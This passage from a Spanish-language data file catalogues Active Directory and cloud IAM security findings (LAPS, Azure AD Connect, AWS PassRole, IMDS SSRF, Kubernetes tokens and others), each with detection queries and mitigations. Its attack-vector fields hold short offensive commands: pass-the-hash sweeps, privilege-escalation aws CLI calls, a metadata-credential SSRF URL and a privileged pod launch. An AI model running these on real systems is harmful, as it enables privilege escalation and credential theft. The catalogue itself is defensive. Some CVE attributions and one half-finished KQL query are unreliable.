    parcheo_remediacion: ['Reset de la gMSA (Reset-ADServiceAccountPassword) o esperar rotación (30 días máx)', 'Restringir la lista de principals', 'Auditar actividad de la gMSA en la ventana'],
    referencias: ['https://attack.mitre.org/techniques/T1555/004/', 'https://github.com/micahvandeusen/gMSADumper'],
  },
  {
    id: 'AD-033',
    nombre: 'LAPS ausente o legible por demasiados',
    categoria: 'AD',
    severidad: 'High',
    mitre_attack: ['T1552.001'],
    descripcion_tecnica: 'Sin LAPS: el admin local comparte password entre hosts (crackmapexec pivota todo). Con LAPS legacy mal configurado: el atributo ms-Mcs-AdmPwd legible por "Domain Users" (default triste en algunas instalaciones). Windows LAPS (2023+) mejora con cifrado (AD DS encryption) pero hay que migrarlo.',
    impacto_iam_soc: 'Un único host comprometido con el mismo admin local = todo el segmento comprometido (pass-the-hash en cadena). La señal de LAPS legible: usuarios normales leyendo ms-Mcs-AdmPwd (4662).',
    vector_ataque: ['crackmapexec smb 10.0.0.0/24 -u admin -H <hash> --local-auth (password reuse)', 'Powerview Get-ADObject -Properties ms-Mcs-AdmPwd si ACL floja'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4662 and ObjectName contains "ms-Mcs-AdmPwd" and SubjectUserName !endswith "$" // lecturas del password LAPS',
      spl: 'index=win EventCode=4662 attribute="ms-Mcs-AdmPwd" | stats count by user, computer',
      win_event_ids: [4662],
    },
    mitigacion_hardening: ['Windows LAPS (nativo 2023+) con cifrado en AD, no el legacy', 'Auditar quién puede leer ms-Mcs-AdmPwd en cada OU (auditando ACLs)', 'Password única por host: nunca reutilizar admin local'],
    parcheo_remediacion: ['Rotar los passwords LAPS (automático al cambiar expiry)', 'Migrar de LAPS legacy a Windows LAPS', 'Hunt de lecturas indebidas del atributo'],
    referencias: ['https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview', 'https://attack.mitre.org/techniques/T1552/001/'],
  },
  {
    id: 'AD-034',
    nombre: 'Credenciales en atributos LDAP (description, info, comment)',
    categoria: 'AD',
    severidad: 'Medium',
    mitre_attack: ['T1552.001'],
    descripcion_tecnica: 'Admins guardan passwords en campos de texto de AD (description: "pass: Verano2024!", info, comment de computadoras). CUALQUIER usuario autenticado puede leerlos con una simple query LDAP — sin herramientas de hacking.',
    impacto_iam_soc: 'Es el "hallazgo gratis" de toda auditoría: contraseñas de service accounts en texto plano en el propio directorio. La detección es una query: Get-ADUser -Filter "Description -like \'*pass*\'" -Properties Description.',
    vector_ataque: ['Get-ADUser -Filter * -Properties Description,Info,Comment | findstr /i pass', 'AD Explorer / ldapsearch: (description=*pass*)'],
    deteccion: {
      kql: '// detección de escritura: 5136 con AttributeLDAPDisplayName in (description, info, comment) por usuarios IT; revisar contenido periódicamente',
      win_event_ids: [5136],
    },
    mitigacion_hardening: ['NUNCA guardar secretos en atributos de AD — política + formación', 'Scan periódico del directorio buscando patrones (pass, pwd, secret, //, http://…:…@)', 'Password managers (o el propio VaultNotes) para documentación de credenciales'],
    parcheo_remediacion: ['Borrar los atributos comprometidos', 'Rotar TODAS las passwords encontradas (asumir leídas)', 'Auditar accesos LDAP históricos si hay logging'],
    referencias: ['https://attack.mitre.org/techniques/T1552/001/', 'https://www.fortra.com/blog/finding-passwords-active-directory-attributes'],
  },
  {
    id: 'AD-035',
    nombre: 'Azure AD Connect (MSOL) → DCSync on-prem',
    categoria: 'AD',
    severidad: 'Critical',
    mitre_attack: ['T1003.006', 'T1098'],
    descripcion_tecnica: 'La cuenta MSOL_xxxxx (Azure AD Connect) tiene derechos de replicación (DCSync) para sincronizar hashes con Entra ID. Comprometida la contraseña (autolog file en el servidor de sync, o DCSync del propio MSOL), el atacante extrae TODOS los hashes NTLM del dominio — y con ellos, acceso a Entra ID vía password hash sync.',
    impacto_iam_soc: 'El servidor de sync es el puje Tier-0 perfecto: contiene credenciales de un servicio con DCSync rights Y acceso al tenant cloud. En incidentes reales (Solorigate-adjacent), pivotar del sync server al cloud es el movimiento estándar.',
    vector_ataque: ['Comprometer el AADConnect server', 'Leer la password MSOL del autolog (Get-ADSyncDatabaseConfiguration / ADSync service account)', 'DCSync con la cuenta MSOL → todos los hashes del dominio'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4662 and SubjectUserName startswith "MSOL_" and IpAddress !in (sync_server_ips) // DCSync desde el MSOL fuera del servidor de sync',
      spl: 'index=win EventCode=4662 user=MSOL_* | stats count by src | where src != "sync_server"',
      win_event_ids: [4662, 4624],
    },
    mitigacion_hardening: ['Tratar el AADConnect server como Tier-0 (acceso restringido, EDR, PIM)', 'Monitorizar 4662 de la cuenta MSOL desde IPs distintas al sync server', 'Rotar la password MSOL periódicamente (wizard de AADConnect)'],
    parcheo_remediacion: ['Rotar password MSOL (reconfigurar el sync)', 'Rotar krbtgt (si hubo DCSync)', 'Revisar el tenant cloud: nuevos app registrations, SSPR changes, MFA devices añadidos'],
    referencias: ['https://attack.mitre.org/techniques/T1003/006/', 'https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/'],
  },
  /* ============================ CLOUD IAM ============================ */
  {
    id: 'CLD-001',
    nombre: 'iam:PassRole + servicio compute (EC2/Lambda/ECS)',
    categoria: 'Cloud_IAM',
    severidad: 'Critical',
    mitre_attack: ['T1078.004', 'T1548'],
    descripcion_tecnica: 'Un principal con iam:PassRole Y permisos de creación de recursos compute (ec2:RunInstances, lambda:CreateFunction, ecs:CreateTask) puede pasar un rol privilegiado (p. ej. un rol admin) a SU recurso y ejecutar código con los permisos de ese rol. El combo clásico de privesc AWS.',
    impacto_iam_soc: 'Escalada de cualquier usuario con PassRole a administrador del account. CloudTrail registra PassRole (eventName=PassRole en el servicio destino) — la correlación PassRole + rol admin + recurso nuevo es la señal.',
    vector_ataque: ['aws lambda create-function --role arn:…:role/AdminRole --code file://evil.zip', 'aws ec2 run-instances --iam-instance-profile AdminProfile con user-data script'],
    deteccion: {
      kql: 'AWSCloudTrail | where EventName in ("PassRole", "CreateFunction", "RunInstances") and Resources contains "AdminRole" | project TimeGenerated, UserIdentity, EventName',
      spl: 'index=aws eventName="PassRole" | stats count by user, role | where role="*admin*"',
    },
    mitigacion_hardening: ['PassRole limitado a roles específicos por Condition (iam:PassedToService + ARNs exactos)', 'Separación: quien crea recursos NO puede pasar roles privilegiados', 'Roles por servicio con least privilege (IAM Access Analyzer findings)'],
    parcheo_remediacion: ['Quitar PassRole del usuario/grupo', 'Rotar credenciales del principal comprometido', 'Auditar CloudTrail por recursos creados con roles admin'],
    referencias: ['https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/', 'https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation'],
  },
  {
    id: 'CLD-002',
    nombre: 'Política wildcard *:* (AdministratorAccess-like)',
    categoria: 'Cloud_IAM',
    severidad: 'Critical',
    mitre_attack: ['T1078.004'],
    descripcion_tecnica: 'Usuarios o roles con Action:"*" Resource:"*" (o el managed policy AdministratorAccess) por "comodidad" o como "temporal" que vive años. Cualquier compromiso de sus credenciales = account takeover total, incluida la eliminación de logs (delete CloudTrail).',
    impacto_iam_soc: 'El riesgo máximo en cloud: un solo access key expuesta borra toda la evidencia (DeleteTrail, DeleteLogGroup) antes del ransomware/exfiltración. Finding #1 de AWS IAM Access Analyzer y de toda revisión cloud.',
    vector_ataque: ['Leak de access key (repo, CI, SSRF a metadata)', 'Uso directo de la key con aws cli como admin', 'Persistencia: crear backdoor users/roles'],
    deteccion: {
      kql: 'AWSCloudTrail | where UserIdentity.arn contains "role/admin" or (EventSource == "cloudtrail.amazonaws.com" and EventName in ("DeleteTrail","StopLogging","UpdateTrail")) | project TimeGenerated, EventName, UserIdentity',
      spl: 'index=aws (eventName=DeleteTrail OR eventName=StopLogging) | stats count by user, src_ip',
    },
    mitigacion_hardening: ['Eliminar *:* de TODO principal humano: usar roles con permisos por tarea', 'Break-glass real: rol de emergencia con MFA + alerta al asumir', 'AWS: SCP (Service Control Policy) que niegue DeleteTrail/StopLogging incluso a admins'],
    parcheo_remediacion: ['Rotar TODAS las keys del principal', 'Revisar CloudTrail de los últimos 90 días por acciones admin', 'Buscar y eliminar backdoors (usuarios/roles/keys creadas)'],
    referencias: ['https://aws.amazon.com/blogs/security/techniques-for-writing-least-privilege-iam-policies/', 'https://cloud.hacktricks.xyz/'],
  },
  {
    id: 'CLD-003',
    nombre: 'SSRF a metadata service (IMDSv1) — robo de credenciales',
    categoria: 'Cloud_IAM',
    severidad: 'Critical',
    cve_ejemplo: ['CVE-2019-11013 (Capital One)'],
    mitre_attack: ['T1552.005', 'T1213'],
    descripcion_tecnica: 'Una SSRF en una app cloud permite pedir http://169.254.169.254/latest/meta-data/iam/security-credentials/<rol> y recibir las keys del instance role. Capital One 2019: 100M registros por exactamente esto. IMDSv2 (session-based) mitiga la SSRF básica.',
    impacto_iam_soc: 'Credenciales cloud sin robar nada del endpoint: la app web es la puerta. Con las keys: movimiento por S3, EC2 y según el rol, todo el account. Señal: tráfico hacia 169.254.169.254 desde procesos web (VPC flow logs / egress logs).',
    vector_ataque: ['URL param ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'Bypass IMDSv2 en apps con redirect/HOP handling', 'GCP/Azure variantes: metadata.google.internal, 169.254.169.254/metadata/instance'],
    deteccion: {
      kql: 'AWSCloudTrail | where SourceIpAddress == "169.254.169.254" or (eventName == "GetSessionToken" and unusual source) // corregir: buscar uso de keys del instance-role desde IPs externas',
      spl: 'index=aws sourcetype=aws:cloudtrail | stats count by sourceIPAddress, userIdentity.arn | where sourceIPAddress NOT LIKE "10.%" AND sourceIPAddress NOT LIKE "172.1[6-9]%"',
    },
    mitigacion_hardening: ['IMDSv2 obligatorio (HttpTokens=required, hop limit 1) en TODAS las instancias/containers', 'Egress filtering del workload hacia 169.254.169.254 salvo el proceso legítimo', 'Roles por servicio mínimos — el rol de una web app NO debe leer S3 de datos'],
    parcheo_remediacion: ['Rotar las credenciales (reemplazar el instance profile/rol)', 'Parchear la SSRF de la app', 'Auditar CloudTrail por uso de esas keys fuera del workload'],
    referencias: ['https://attack.mitre.org/techniques/T1552/005/', 'https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-role-credentials/'],
  },
  {
    id: 'CLD-004',
    nombre: 'Confused deputy / cross-tenant role trust',
    categoria: 'Cloud_IAM',
    severidad: 'High',
    mitre_attack: ['T1078.004'],
    descripcion_tecnica: 'Un rol cuyo trust policy permite Principal: "*" o cuentas externas sin condición aws:PrincipalOrgID / ExternalId. Cualquier cuenta AWS (o una subcuenta de un cliente) puede asumir el rol — el "confused deputy" clásico documentado por AWS.',
    impacto_iam_soc: 'Acceso a los recursos del account sin robar nada: solo conociendo el ARN del rol. Muy frecuente en SaaS multi-tenant mal construidos y en roles de automatización que se configuraron "para pruebas".',
    vector_ataque: ['aws sts assume-role --role-arn arn:aws:iam::VICTIMA:role/TrustAll', 'Sin ExternalId: cualquier principal externo listado (o *) entra'],
    deteccion: {
      kql: 'AWSCloudTrail | where EventName == "AssumeRole" and ResponseElements !contains "externalId" | summarize dcount(SourceIpAddress) by RoleArn | where dcount > 3 // assume desde cuentas/IPs inesperadas',
      spl: 'index=aws eventName=AssumeRole | stats dc(src) by role | where dc(src) > 2',
    },
    mitigacion_hardening: ['Trust policies: nunca Principal "*", siempre cuenta específica + ExternalId para escenarios third-party', 'Condition aws:PrincipalOrgID para escenarios intra-org', 'IAM Access Analyzer para detectar recursos expuestos externamente'],
    parcheo_remediacion: ['Endurecer el trust policy del rol', 'Rotar credenciales de sesiones asumidas', 'Auditar AssumeRole histórico desde principals externos'],
    referencias: ['https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html', 'https://hackingthe.cloud/aws/exploitation/'],
  },
  {
    id: 'CLD-005',
    nombre: 'iam:UpdateAssumeRolePolicy / CreateAccessKey privesc',
    categoria: 'Cloud_IAM',
    severidad: 'Critical',
    mitre_attack: ['T1098', 'T1548'],
    descripcion_tecnica: 'Permisos IAM de administración de credenciales que son un one-way privesc: iam:CreateAccessKey sobre un admin (crea keys de OTRO), iam:UpdateAssumeRolePolicy (re-dirige el trust de un rol a sí mismo), iam:AddUserToGroup, iam:AttachUserPolicy. La lista completa está en la doc de privesc AWS de Rhino Security.',
    impacto_iam_soc: 'Cualquiera de estos permisos aislados escala a admin del account. El SOC debe alertar sobre CreateAccessKey donde requester != target user, y AddUserToGroup fuera de los flujos IT.',
    vector_ataque: ['aws iam create-access-key --user-name admin (crea keys del admin)', 'aws iam update-assume-role-policy --role-name AdminRole --policy-document mi-trust.json'],
    deteccion: {
      kql: 'AWSCloudTrail | where EventName in ("CreateAccessKey","UpdateAssumeRolePolicy","AddUserToGroup","AttachUserPolicy") | project TimeGenerated, UserIdentity, RequestParameters',
      spl: 'index=aws (eventName=CreateAccessKey OR eventName=AddUserToGroup) | stats count by user, target',
    },
    mitigacion_hardening: ['Permiso IAM de gestión de credenciales SOLO en un rol de break-glass', 'SCP que niegue iam:* a todos los no-admins', 'Alertar CreateAccessKey con requester≠target'],
    parcheo_remediacion: ['Desactivar/eliminar las keys creadas ilegítimamente', 'Revertir trust policies modificados', 'Auditar sesiones del rol comprometido'],
    referencias: ['https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/', 'https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation'],
  },
  {
    id: 'CLD-006',
    nombre: 'Access key leakage (repos, CI/CD, logs)',
    categoria: 'Cloud_IAM',
    severidad: 'Critical',
    mitre_attack: ['T1552.001', 'T1552.003'],
    descripcion_tecnica: 'Access keys en GitHub commits (públicos y privados), variables de CI visibles en logs de build, screenshots, Slack, archivos de configuración versionados. Los bots de GitHub (secret scanning) y los atacantes encuentran keys en minutos. Long-lived keys de usuarios IAM son el peor caso.',
    impacto_iam_soc: 'Es la causa #1 de compromisos cloud: botnet de scanners prueba AKIA… contra AWS API en <5 min desde el push. El CloudTrail del account víctima muestra llamadas desde todo el mundo.',
    vector_ataque: ['git push con ~/.aws/credentials o terraform tfvars', 'docker image con secrets en layers', 'CI log que imprime ENV vars'],
    deteccion: {
      kql: 'AWSCloudTrail | where UserIdentity.type == "IAMUser" and SourceIpAddress !in (corporate_ranges) | summarize dcount(SourceIpAddress) by UserIdentity | where dcount > 3 // keys usadas desde IPs dispersas',
      spl: 'index=aws sourcetype=aws:cloudtrail | stats dc(src_ip) by user | where dc(src_ip) > 4',
    },
    mitigacion_hardening: ['CERO long-lived keys: roles OIDC de GitHub Actions, roles de tareas ECS/Lambda, Workload Identity en K8s', 'Secret scanning en pre-commit (gitleaks) + en el repo (push protection)', 'Keys de emergencia solo con expiración y alarmas'],
    parcheo_remediacion: ['Desactivar la key YA (disable antes que delete: conserva la investigación)', 'Rotar credenciales relacionadas', 'Auditar CloudTrail completo de esa key (todas las regiones!)'],
    referencias: ['https://docs.github.com/en/code-security/secret-scanning', 'https://github.com/gitleaks/gitleaks'],
  },
  {
    id: 'CLD-007',
    nombre: 'Azure illicit consent / multi-tenant app takeover',
    categoria: 'Cloud_IAM',
    severidad: 'High',
    mitre_attack: ['T1528', 'T1098'],
    descripcion_tecnica: 'App registration multi-tenant en el tenant atacante con OAuth permissions; phishing de consent a usuarios del tenant víctima. El atacante obtiene tokens con los permisos concedidos que se renuevan indefinidamente. En Azure: Grants de Graph API (Mail.Read, Files.Read) — el token de app funciona mientras el consent exista.',
    impacto_iam_soc: 'Persistencia en M365 sin tocar endpoints: lectura de correo (password reset de terceros), OneDrive, y pivote. Las peticiones salen desde IPs de Microsoft — geo-blocking inútil. Detección solo vía audit de OAuth grants.',
    vector_ataque: ['Registrar multi-tenant app en tenant atacante', 'Phishing: "Microsoft 365 Security quiere permisos" (nombre clonado)', 'Refresh token offline indefinido'],
    deteccion: {
      kql: 'AuditLogs | where OperationName == "Consent to application" | extend AppId = tostring(TargetResources[0].id) | project TimeGenerated, InitiatedBy, AppId // alerta en consents a apps no-publicadas',
      spl: 'index=o365 Workload=AzureActiveDirectory Operation="Consent to application." | stats count by AppId, UserId',
    },
    mitigacion_hardening: ['User consent OFF o limitado a editores verificados; admin consent workflow', 'App governance policies (Defender for Cloud Apps) con alertas de apps nuevas', 'Revisión mensual de OAuth2PermissionGrants del tenant'],
    parcheo_remediacion: ['Revocar el consent (Revoke-AzureADUserAllRefreshToken + remove grant)', 'Bloquear el AppId atacante tenant-wide', 'Reset de sesión de los usuarios phisheados'],
    referencias: ['https://attack.mitre.org/techniques/T1528/', 'https://learn.microsoft.com/en-us/defender-office-365/detect-and-remediate-illicit-consent-grants'],
  },
  {
    id: 'CLD-008',
    nombre: 'Managed Identity abuse (App Service/Function editor)',
    categoria: 'Cloud_IAM',
    severidad: 'High',
    mitre_attack: ['T1078.004'],
    descripcion_tecnica: 'Comprometido un App Service/Function con Managed Identity, el atacante usa Kudu (SCM) console o el editor de código para pedir token del MI: http://169.254.129.2:8081/msi/token o env IDENTITY_ENDPOINT. Los permisos del MI aplican: a menudo Contributor sobre toda la subscription por "comodidad".',
    impacto_iam_soc: 'Salto de RCE web a control de subscription sin robar credenciales (el MI no tiene secret que robar — es endpoint interno). En Azure la señal es: llamadas a IDENTITY_ENDPOINT / ARM desde el proceso web, y role assignments ejecutados por la identidad.',
    vector_ataque: ['RCE/SSRF en el App Service → curl $IDENTITY_ENDPOINT con header X-IDENTITY-HEADER', 'az login con el token del MI → Contributor actions'],
    deteccion: {
      kql: 'AzureActivity | where Caller contains "managedIdentity" or (OperationNameValue contains "roleAssignments" and Level == "Started") | project TimeGenerated, Caller, OperationNameValue',
      spl: 'index=azure activity="Microsoft.Authorization/roleAssignments/write" | stats count by caller',
    },
    mitigacion_hardening: ['Managed Identities con roles específicos (p. ej. solo lectura de un storage), nunca Contributor', 'Bloquear SCM/Kudu publicamente (restricción de acceso, IP allowlist, deshabilitar FTP/SSH innecesario)', 'App insights + alertas de peticiones al MSI endpoint desde procesos no esperados'],
    parcheo_remediacion: ['Parchear la vulnerabilidad web de origen', 'Rotar la identidad (re-create MI) si hay sospecha de abuso', 'Auditar AzureActivity del MI en la ventana'],
    referencias: ['https://learn.microsoft.com/en-us/azure/app-service/overview-managed-identity', 'https://cloud.hacktricks.xyz/pentesting-cloud/azure-security/az-services/az-app-service'],
  },
  {
    id: 'CLD-009',
    nombre: 'PIM ausente / admins permanentes en el tenant',
    categoria: 'Cloud_IAM',
    severidad: 'Medium',
    mitre_attack: ['T1078.004'],
    descripcion_tecnica: 'Global Admin permanente en 20 personas "por si acaso". Sin PIM (Privileged Identity Management): cero JIT, cero aprobación, cero MFA adicional al activar. Cada sesión de cada admin es una superficie de robo permanente.',
    impacto_iam_soc: 'Un phish de cualquier admin permanente = tenant takeover (Global Admin puede hacer casi todo incluido resetear MFA de otros y crear backdoor apps). El SOC no distingue actividad legítima de comprometida porque siempre hayadmins activos.',
    vector_ataque: ['Phishing/infostealer sobre un admin permanente', 'Golden SAML / token signing (con DA on-prem sync)'],
    deteccion: {
      kql: 'AuditLogs | where OperationName == "Add member to role" and TargetResources[0].displayName == "Global Administrator" | project TimeGenerated, InitiatedBy, TargetResources // assignments permanentes vs eligible',
      spl: 'index=o365 Operation="Add member to role." role="Global Administrator" | stats count by user, type',
    },
    mitigacion_hardening: ['Entra PIM: roles solo ELIGIBLE, activación con MFA + aprobación + ventana 1-8h', 'Global Admin < 5 personas (break-glass: 2 cuentas cloud-only excluidas de PIM)', 'Alertas de asignación permanente de roles privilegiados'],
    parcheo_remediacion: ['Convertir asignaciones permanentes a eligible (PIM)', 'Revisar role assignments históricos (Entra audit)', 'Hunt de actividad de los admins en la ventana de sospecha'],
    referencias: ['https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-configure', 'https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/best-practices'],
  },
  {
    id: 'CLD-010',
    nombre: 'GCP service account key theft + impersonation chains',
    categoria: 'Cloud_IAM',
    severidad: 'Critical',
    mitre_attack: ['T1078.004', 'T1098'],
    descripcion_tecnica: 'Service accounts con keys JSON descargadas (fugas en repos) o con permisos iam:serviceAccounts.actAs que permiten impersonar a OTRO SA más privilegiado. Las cadenas de impersonation (A actúa como B que actúa como C) rompen el modelo mental de quién-hizo-qué en los audit logs.',
    impacto_iam_soc: 'GCP privesc favorito: un SA con actAs sobre otro con roles/owner. Los audit logs muestran la cadena (principal + delegationChain) pero hay que buscarla explícitamente. Keys JSON nunca expiran por defecto.',
    vector_ataque: ['Leak de SA key JSON (repo/CI)', 'gcloud auth activate-service-account --key-file=stolen.json', 'Impersonation: gcloud --impersonate-service-account=sa-privilegiada@…'],
    deteccion: {
      kql: 'GCP_Audit | where ProtoPayload.methodName contains "GenerateAccessToken" or ProtoPayload.authenticationInfo contains "delegationChain" | project TimeGenerated, ProtoPayload.authenticationInfo',
      spl: 'index=gcp "GenerateAccessToken" | stats count by principal, target | where principal != target',
    },
    mitigacion_hardening: ['CERO keys de SA salvo legado documentado: Workload Identity Federation para CI/CD y GKE', 'Auditar quién tiene actAs sobre cada SA (privesc paths: tools como gcp-priv-esc)', 'Organización policy: constraints/iam.disableServiceAccountKeyCreation'],
    parcheo_remediacion: ['Borrar las keys comprometidas (gcloud iam keys delete)', 'Rotar las restantes y revisar role bindings', 'Auditar audit logs por delegación de la SA'],
    referencias: ['https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-privilege-escalation', 'https://github.com/carlospolop/gcp_privesc_scripts'],
  },
  {
    id: 'CLD-011',
    nombre: 'Storage público / ACL pre-configurada (S3-GCS-Blob)',
    categoria: 'Cloud_IAM',
    severidad: 'High',
    mitre_attack: ['T1619', 'T1552.001'],
    descripcion_tecnica: 'Buckets/containers con public read (o write!) por legado o por "compartir un archivo": AllUsers en GCS, public-access en S3 (Block Public Access off), blobs con SAS URLs eternas. Además: misconfiguración que permite listing (enumeración de todos los archivos).',
    impacto_iam_soc: 'Data leak masivo sin explotar nada: los scanners (Shodan, Grayhatwarfare) indexan buckets públicos. Con write público: dropper hosting y ransomware de datos. SAS tokens sin expiración viven para siempre.',
    vector_ataque: ['curl https://bucket.s3.amazonaws.com/ (listing)', 'SAS URL compartida por Slack en 2021 sigue viva', 'GCS con allUsers storage.objects.list'],
    deteccion: {
      kql: 'AWSCloudTrail | where EventName == "PutBucketAcl" or (EventName == "GetObject" and SourceIpAddress !in (corp)) | summarize count() by RequestParameters | where count > 100 // dump de bucket',
      spl: 'index=aws eventName="GetObject" bucket=corp-data | stats count by src_ip | where src_ip != internal | sort -count',
    },
    mitigacion_hardening: ['S3: Block Public Access a nivel de account (ya default en cuentas nuevas — verificar las viejas)', 'GCS: uniform bucket-level access + public access prevention', 'SAS de corta vida + revocación; escaneo con scanning tools (CloudSploit/Prowler)'],
    parcheo_remediacion: ['Cerrar el acceso público del bucket', 'Rotar SAS tokens / firmar URLs nuevas', 'Auditar access logs por descargas masivas históricas'],
    referencias: ['https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration', 'https://github.com/prowler-cloud/prowler'],
  },
  {
    id: 'CLD-012',
    nombre: 'Legacy auth / basic auth contra el tenant',
    categoria: 'Cloud_IAM',
    severidad: 'High',
    mitre_attack: ['T1110.003'],
    descripcion_tecnica: 'POP3/IMAP/SMTP AUTH y otros protocolos legacy de Microsoft 365 NO soportan MFA moderno — solo password. Password spray contra Autodiscover básico es el acceso inicial clásico de BEC (Business Email Compromise) que sigue funcionando en tenants sin bloqueo.',
    impacto_iam_soc: 'Compromiso de buzón con solo password, invisible a las políticas de MFA. Con el buzón: reglas de inbox (persistencia), password resets de terceros, fraude del CEO. Señal: SigninLogs con ClientApp = IMAP4/POP3/Exchange ActiveSync (legacy).',
    vector_ataque: ['Spray contra outlook.office365.com:993 IMAP', 'Reglas de inbox ocultas para monitoreo de pagos'],
    deteccion: {
      kql: 'SigninLogs | where ClientAppUsed in ("IMAP4", "POP3", "SMTP", "Exchange ActiveSync") and ResultType == 0 | project TimeGenerated, UserPrincipalName, ClientAppUsed, IPAddress',
      spl: 'index=o365 app="IMAP4" outcome=success | stats count by user, src',
    },
    mitigacion_hardening: ['Authentication methods policy: deshabilitar Basic Auth COMPLETO (Microsoft lo forzó enOct 2022 — verificar overrides)', 'Conditional Access bloqueando protocolos legacy', 'Mailbox rules monitoring (creación de reglas raras = BEC confirmado)'],
    parcheo_remediacion: ['Purgar sesiones del buzón comprometido', 'Eliminar las inbox rules maliciosas', 'Reset password + MFA re-enroll del usuario'],
    referencias: ['https://learn.microsoft.com/en-us/exchange/clients-and-mobile-in-exchange-online/deprecation-of-basic-authentication-exchange-online', 'https://attack.mitre.org/techniques/T1110/003/'],
  },
  {
    id: 'CLD-013',
    nombre: 'Conditional Access gaps (exclusiones, MFA no forzado)',
    categoria: 'Cloud_IAM',
    severidad: 'Medium',
    mitre_attack: ['T1078.004'],
    descripcion_tecnica: 'Políticas de CA con exclusiones "temporales" eternas, o que no cubren apps legacy, o sin control de dispositivo. Caso típico: la política excluye a "break-glass" y a 5 admins "porque rompía su PowerShell", dejándolos fuera de MFA.',
    impacto_iam_soc: 'Las brechas de CA son la puerta trasera de los controles cloud: el spray/stealer entra justo por la exclusión. Además sin report-only mode no hay forma de validar el impacto antes de activar.',
    vector_ataque: ['Excluded user en la política MFA', 'App legacy no cubierta por ninguna política (CA aplica por app)'],
    deteccion: {
      kql: 'SigninLogs | where ConditionalAccessStatus == "notApplied" and ResultType == 0 | summarize dcount(UserId) by AppDisplayName | take 20 // logins exitosos donde NO aplicó ninguna CA',
      spl: 'index=o365 ca_status="not applied" outcome=success | stats count by app',
    },
    mitigacion_hardening: ['Baseline CA: block legacy auth + MFA all users + device compliance para admins', 'Cero exclusiones permanentes: break-glass excluido pero con password de 100+ chars y alerta dedicada', 'Revisar SigninLogs semanalmente por notApplied (logins sin política)'],
    parcheo_remediacion: ['Cubrir las apps con brechas', 'Eliminar exclusiones eternas', 'Auditar logins de los excluidos históricamente'],
    referencias: ['https://learn.microsoft.com/en-us/entra/identity/conditional-access/plan-conditional-access', 'https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-policies'],
  },
  {
    id: 'CLD-014',
    nombre: 'Kubernetes SA token theft / cluster-admin RBAC',
    categoria: 'Cloud_IAM',
    severidad: 'Critical',
    mitre_attack: ['T1552.001', 'T1078.004'],
    descripcion_tecnica: 'El ServiceAccount default con token montado automático en pods + RBAC flojo (cluster-admin bindings o SA con create pods) = compromiso de pod → crear pod privilegiado → escape a node → kubelet admin. Los tokens JWT de SA no expiran (legado) salvo projection moderna.',
    impacto_iam_soc: 'Container escape y control del cluster. El SOC cloud ve acciones de la SA sin saber qué pod las origina. Señal: uso del SA token desde IPs fuera del cluster y creación de pods privileged/hostPID.',
    vector_ataque: ['Leer /var/run/secrets/kubernetes.io/serviceaccount/token del pod comprometido', 'kubectl --token=… auth can-i --list (recon RBAC)', 'kubectl run pwn --image=… --privileged (escape a node)'],
    deteccion: {
      kql: 'AzureDiagnostics (AKS) | where Category == "kube-audit" and log_s contains "create" and log_s contains "privileged" | project TimeGenerated, log_s',
      spl: 'index=k8s audit verb=create resource=pods privileged=true | stats count by user, src',
    },
    mitigacion_hardening: ['automountServiceAccountToken: false en todos los pods (salvo los que lo necesitan)', 'RBAC least privilege: sin cluster-admin humano permanente, sin SA con pods/create innecesario', 'Pod Security Standards restricted + admission controllers (no privileged/hostPID)'],
    parcheo_remediacion: ['Rotar los SA tokens comprometidos (bound tokens expiran; legacy: recrear SA)', 'Eliminar pods privilegiados maliciosos', 'Auditar kube-audit logs por uso del token'],
    referencias: ['https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/', 'https://attack.mitre.org/techniques/T1552/001/'],
  },
  {
    id: 'CLD-015',
    nombre: 'CI/CD pipeline poisoning → cloud creds',
    categoria: 'Cloud_IAM',
    severidad: 'Critical',
    cve_ejemplo: ['CVE-2025-30065'],
    mitre_attack: ['T1195', 'T1078.004'],
    descripcion_tecnica: 'Pull request con workflow malicioso (GitHub Actions), dependency confusion, o takeover de action/branch: el pipeline ejecuta código del atacante CON las credenciales del repo (OIDC role, GITHUB_TOKEN, secrets). Casos reales: tj-actions/changed-files (2025) y pastejack de artifacts.',
    impacto_iam_soc: 'Del PR al cloud: el runner tiene el rol OIDC del deploy. Señales: workflows ejecutados desde forks/pull_request_target, secrets printeados en logs, artifacts descargados por procesos raros.',
    vector_ataque: ['PR con .github/workflows/evil.yml + pull_request_target trigger', 'Steal de $GITHUB_TOKEN / secrets del contexto', 'Artifact poisoning: subir un artifact que sobreescribe el legítimo'],
    deteccion: {
      kql: '// GitHub audit: WorkflowRun desde forks con pull_request_target; revisar runs con secrets accesados y logs con "***" masivos',
      spl: 'index=github action=pull_request_target fork=true | stats count by repo, actor',
    },
    mitigacion_hardening: ['pull_request_target PROHIBIDO o solo con checkout ref seguro', 'OIDC: role por ambiente con sub condition exacta (repo:org/repo:ref:refs/heads/main)', 'permissions: mínimos en cada workflow; secrets solo a lo necesario'],
    parcheo_remediacion: ['Rotar todos los secrets del repo y el rol OIDC', 'Purgar artifacts/runners comprometidos (self-hosted runners: forense)', 'Auditar deploys hechos durante la ventana'],
    referencias: ['https://securitylab.github.com/research/github-actions-preventing-pwn-requests/', 'https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions'],
  },
  {
    id: 'CLD-016',
    nombre: 'API keys en clientes públicos (web/mobile)',
    categoria: 'Cloud_IAM',
    severidad: 'High',
    mitre_attack: ['T1552.001'],
